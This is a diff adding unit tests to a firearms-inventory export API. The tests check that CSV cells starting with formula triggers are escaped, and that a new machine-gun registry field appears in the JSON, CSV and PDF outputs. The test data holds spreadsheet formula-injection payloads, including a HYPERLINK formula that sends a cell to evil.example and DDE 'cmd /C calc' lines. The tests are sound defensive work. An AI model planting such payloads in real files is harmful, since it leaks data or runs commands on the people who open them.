@@ -727,6 +727,43 @@ describe("GET /api/exports/full-armory", () => {
     expect(csv).toContain("totalSupplies");
   });
 
+  // A cell that starts with = + - @, a tab or a carriage return opens as a
+  // formula in a spreadsheet. Any signed-in user can type one into a name or
+  // a note, and whoever opens the export would run it.
+  it.each([
+    ["=", '=HYPERLINK("http://evil.example/?"&A1,"open")'],
+    ["+", "+1+cmd|' /C calc'!A0"],
+    ["-", "-2+3+cmd|' /C calc'!A0"],
+    ["@", "@SUM(1+1)*cmd|' /C calc'!A0"],
+    ["a tab", "\t=1+1"],
+    ["a carriage return", "\r=1+1"],
+  ])("CSV: user text starting with %s is written with a leading ' so it opens as text", async (_name, text) => {
+    mocks.findFirearms.mockResolvedValue([
+      { id: "firearm-1", name: text, manufacturer: "Acme", model: "M4", caliber: "5.56", serialNumber: "ABC123456", type: "RIFLE", acquisitionDate: null, purchasePrice: 1200, currentValue: 1450, notes: text, imageUrl: null },
+    ]);
+    const response = await GET(new NextRequest("http://localhost/api/exports/full-armory?format=csv"));
+    const cells = parseCsv(await response.text()).flat();
+    // The name (and wherever else the export repeats the text) is guarded...
+    expect(cells.filter((cell) => cell === `'${text}`).length).toBeGreaterThanOrEqual(1);
+    expect(cells).not.toContain(text);
+    // ...and no cell anywhere in the file starts with a trigger character, a negative number aside.
+    expect(cells.filter((cell) => /^[=+\-@\t\r]/.test(cell) && !/^-\d+(\.\d+)?$/.test(cell))).toEqual([]);
+  });
+
+  it("CSV: a negative number stays a number, and a value holding a bare carriage return is quoted", async () => {
+    mocks.findFirearms.mockResolvedValue([
+      { id: "firearm-1", name: "Duty Carbine", manufacturer: "Acme", model: "M4", caliber: "5.56", serialNumber: "ABC123456", type: "RIFLE", acquisitionDate: null, purchasePrice: -5, currentValue: -12.5, notes: "line one\rline two", imageUrl: null },
+    ]);
+    const response = await GET(new NextRequest("http://localhost/api/exports/full-armory?format=csv"));
+    const csv = await response.text();
+    const cells = parseCsv(csv).flat();
+    expect(cells).toContain("-5");
+    expect(cells).toContain("-12.5");
+    expect(cells).not.toContain("'-5");
+    expect(cells).not.toContain("'-12.5");
+    expect(csv).toContain('"line one\rline two"');
+  });
+
   it("returns PDF bytes for download format", async () => {
     const request = new NextRequest("http://localhost/api/exports/full-armory?format=pdf&includeDocuments=false");
     const response = await GET(request);
@@ -1231,6 +1268,52 @@ describe("GET /api/exports/full-armory", () => {
     expect(redacted).not.toContain("SUP-98765");
     // The line stays, so the reader still learns the item is registered.
     expect(redacted).toContain("NFA: Form 1 (make) | Control: N/A | Approved: 2024-06-10 | Tax: 200 | Registered To: Jane Q Owner");
+  });
+
+  const documentedMachineGun = {
+    ...documentedSbr,
+    id: "firearm-mg",
+    type: "PDW",
+    nfaClass: "MACHINE_GUN",
+    mgRegistry: "PRE_SAMPLE",
+  };
+
+  it("asks the database for mgRegistry", async () => {
+    await GET(new NextRequest("http://localhost/api/exports/full-armory"));
+
+    expect(mocks.findFirearms.mock.calls[0][0].select).toMatchObject({ mgRegistry: true });
+  });
+
+  it("puts mgRegistry right after nfaClass in JSON and CSV, blank when unset", async () => {
+    mocks.findFirearms.mockResolvedValue([documentedMachineGun, documentedSbr]);
+
+    const json = await (await GET(new NextRequest("http://localhost/api/exports/full-armory"))).json();
+    expect(Object.keys(json.items[0]).indexOf("mgRegistry")).toBe(Object.keys(json.items[0]).indexOf("nfaClass") + 1);
+    expect(json.items.map((item: { mgRegistry: string }) => item.mgRegistry)).toEqual([
+      "PRE_SAMPLE",
+      "",
+      // the beforeEach accessory has no registry
+      "",
+    ]);
+
+    const csv = await (await GET(new NextRequest("http://localhost/api/exports/full-armory?format=csv"))).text();
+    const header = csv.split("\n")[0].split(",");
+    expect(header.indexOf("mgRegistry")).toBe(header.indexOf("nfaClass") + 1);
+    const rows = csv.split("\n").filter((line) => line.startsWith("inventory,"));
+    const column = header.indexOf("mgRegistry");
+    expect(rows[0].split(",")[column]).toBe("PRE_SAMPLE");
+    expect(rows[1].split(",")[column]).toBe("");
+  });
+
+  it("prints the registry label after the class in the PDF only when there is one", async () => {
+    mocks.findFirearms.mockResolvedValue([documentedMachineGun, documentedSbr]);
+
+    const text = extractPdfFlatText(
+      await (await GET(new NextRequest("http://localhost/api/exports/full-armory?format=pdf"))).text()
+    );
+
+    expect(text).toContain("| Class: Machine Gun | Registry: Pre-sample |");
+    expect(text).toContain("2. FIREARM Acme M4 SBR | Type: RIFLE | Class: SBR | Serial:");
   });
 
   it("prints no NFA line in the PDF for an item with no paperwork", async () => {
